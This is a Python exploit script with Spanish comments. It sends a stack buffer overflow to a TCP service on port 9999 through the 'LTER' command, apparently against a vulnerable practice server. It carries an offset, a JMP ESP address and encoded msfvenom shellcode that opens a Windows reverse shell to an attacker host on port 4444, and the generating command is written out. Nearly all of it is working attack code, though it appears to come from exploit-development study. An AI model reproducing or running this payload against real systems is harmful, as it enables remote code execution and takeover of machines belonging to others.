#!/usr/bin/python3

import os 					# Funciones para interactuar con el sistema operativo subyacente.
import sys					# Acceso a algunas variables utilizadas o mantenidas por python.
import socket 				# Proporciona una interfaz de red de bajo nivel. (Establece una conexión TCP con el host y el puerto especificado)
import signal 				# Proporciona funciones constantes para manejar señales del sistema.
from struct import pack  	# STRUCT (convertir entre valores Python y cadenas de bytes) PACK (empaquetar datos para enviar el payload a través de la conexión de red)

def signal_handler(sig, frame):				# CTRL + C
    print('\n[+] Saliendo del exploit...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

host = "192.168.209.170"	# IP victima
port = 9999					# Puerto victima

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.209.171 LPORT=4444 EXITFUNC=thread -e x86/alpha_mixed -b "\x00" BufferRegister=ESP -f c
# Payload

shellcode = (b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
b"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
b"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x5a\x48"
b"\x4c\x42\x77\x70\x75\x50\x47\x70\x45\x30\x6d\x59\x6a\x45"
b"\x76\x51\x39\x50\x75\x34\x4c\x4b\x52\x70\x50\x30\x4e\x6b"
b"\x32\x72\x74\x4c\x6e\x6b\x32\x72\x65\x44\x4e\x6b\x63\x42"
b"\x76\x48\x76\x6f\x78\x37\x61\x5a\x31\x36\x30\x31\x39\x6f"
b"\x6e\x4c\x67\x4c\x33\x51\x63\x4c\x45\x52\x34\x6c\x67\x50"
b"\x5a\x61\x48\x4f\x34\x4d\x65\x51\x5a\x67\x68\x62\x7a\x52"
b"\x56\x32\x42\x77\x4c\x4b\x32\x72\x66\x70\x4c\x4b\x61\x5a"
b"\x47\x4c\x6c\x4b\x72\x6c\x32\x31\x62\x58\x6b\x53\x57\x38"
b"\x56\x61\x6a\x71\x33\x61\x6e\x6b\x30\x59\x37\x50\x57\x71"
b"\x6e\x33\x6c\x4b\x57\x39\x35\x48\x7a\x43\x44\x7a\x50\x49"
b"\x4c\x4b\x44\x74\x4e\x6b\x75\x51\x59\x46\x34\x71\x6b\x4f"
b"\x6e\x4c\x6b\x71\x6a\x6f\x56\x6d\x46\x61\x4a\x67\x75\x68"
b"\x49\x70\x32\x55\x79\x66\x66\x63\x51\x6d\x58\x78\x77\x4b"
b"\x61\x6d\x45\x74\x50\x75\x58\x64\x52\x78\x4e\x6b\x66\x38"
b"\x67\x54\x66\x61\x6e\x33\x61\x76\x6e\x6b\x34\x4c\x32\x6b"
b"\x4e\x6b\x76\x38\x67\x6c\x77\x71\x39\x43\x6e\x6b\x73\x34"
b"\x6e\x6b\x46\x61\x78\x50\x6d\x59\x63\x74\x66\x44\x35\x74"
b"\x61\x4b\x73\x6b\x63\x51\x70\x59\x51\x4a\x32\x71\x59\x6f"
b"\x69\x70\x31\x4f\x61\x4f\x50\x5a\x4e\x6b\x62\x32\x58\x6b"
b"\x4c\x4d\x53\x6d\x65\x38\x57\x43\x45\x62\x53\x30\x77\x70"
b"\x65\x38\x43\x47\x70\x73\x36\x52\x61\x4f\x43\x64\x42\x48"
b"\x30\x4c\x43\x47\x31\x36\x55\x57\x69\x6f\x7a\x75\x6c\x78"
b"\x5a\x30\x56\x61\x57\x70\x67\x70\x54\x69\x7a\x64\x56\x34"
b"\x66\x30\x32\x48\x71\x39\x6d\x50\x50\x6b\x53\x30\x59\x6f"
b"\x69\x45\x46\x30\x52\x70\x46\x30\x56\x30\x51\x50\x46\x30"
b"\x47\x30\x30\x50\x61\x78\x4b\x5a\x36\x6f\x49\x4f\x4b\x50"
b"\x49\x6f\x68\x55\x4d\x47\x50\x6a\x35\x55\x32\x48\x59\x50"
b"\x6f\x58\x6a\x71\x6e\x4b\x32\x48\x73\x32\x37\x70\x64\x51"
b"\x73\x6c\x6c\x49\x4b\x56\x51\x7a\x66\x70\x71\x46\x46\x37"
b"\x45\x38\x4e\x79\x4c\x65\x73\x44\x70\x61\x6b\x4f\x48\x55"
b"\x4f\x75\x4f\x30\x72\x54\x34\x4c\x79\x6f\x50\x4e\x65\x58"
b"\x42\x55\x6a\x4c\x62\x48\x4a\x50\x58\x35\x6f\x52\x30\x56"
b"\x59\x6f\x6b\x65\x73\x58\x50\x63\x70\x6d\x50\x64\x33\x30"
b"\x4b\x39\x79\x73\x46\x37\x33\x67\x73\x67\x35\x61\x49\x66"
b"\x61\x7a\x57\x62\x43\x69\x52\x76\x6b\x52\x49\x6d\x30\x66"
b"\x69\x57\x37\x34\x36\x44\x35\x6c\x36\x61\x35\x51\x6c\x4d"
b"\x61\x54\x46\x44\x54\x50\x39\x56\x33\x30\x63\x74\x30\x54"
b"\x66\x30\x51\x46\x72\x76\x36\x36\x43\x76\x31\x46\x52\x6e"
b"\x51\x46\x70\x56\x42\x73\x36\x36\x63\x58\x42\x59\x6a\x6c"
b"\x47\x4f\x4e\x66\x69\x6f\x38\x55\x4f\x79\x4b\x50\x62\x6e"
b"\x42\x76\x52\x66\x79\x6f\x46\x50\x51\x78\x64\x48\x4f\x77"
b"\x75\x4d\x53\x50\x79\x6f\x4b\x65\x4d\x6b\x59\x70\x65\x4d"
b"\x74\x6a\x56\x6a\x42\x48\x39\x36\x4f\x65\x4d\x6d\x6f\x6d"
b"\x4b\x4f\x79\x45\x67\x4c\x65\x56\x51\x6c\x34\x4a\x4b\x30"
b"\x4b\x4b\x4d\x30\x61\x65\x36\x65\x4d\x6b\x72\x67\x72\x33"
b"\x31\x62\x30\x6f\x31\x7a\x57\x70\x33\x63\x69\x6f\x5a\x75"
b"\x41\x41")

buffer = b"A" * 2003			# offset (Es el codigo que va antes de llegar al fallo).
buffer += b"\x03\x12\x50\x62"	# jum ESP (Es el salto a la pila ESP).
buffer += shellcode				# Contiene el payload en este caso se le llamo shellcode.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# En general - Realiza la conexion TCP.
s.connect((host,port))									# Conecta con el host objetivo mediante el puerto.
print (s.recv(1024).decode())							# Muestra hasta 1024 caracteres de la respuesta del pc victima (Como banners P.Ej).
print ("[+] Sending exploit...")						# Mensaje de que se envia el exploit.
s.send(b"LTER /.:/" + buffer)							# Se envia el comando LTER/.:/ en bytes (b) + todo el contenido de la variable buffer.
print (s.recv(1024).decode())							# Muestra hasta 1024 caracteres de la respuesta del pc victima.
s.close()												# Cierra la ejecucion.